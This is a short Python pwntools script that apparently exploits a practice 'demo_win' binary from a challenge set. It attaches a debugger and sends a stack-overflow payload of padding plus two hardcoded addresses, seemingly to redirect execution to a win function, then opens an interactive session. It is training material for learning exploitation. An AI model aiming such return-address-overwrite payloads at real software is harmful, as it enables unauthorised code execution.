from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/1-demo-win/demo_win")
pwn.gdb.attach(p)
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x04@\x00\x00\x00\x00\x00\xaf\x05@\x00\x00\x00\x00\x00\n'
p.send(payload)
p.recvuntil(b"Let's do it!")
p.interactive()
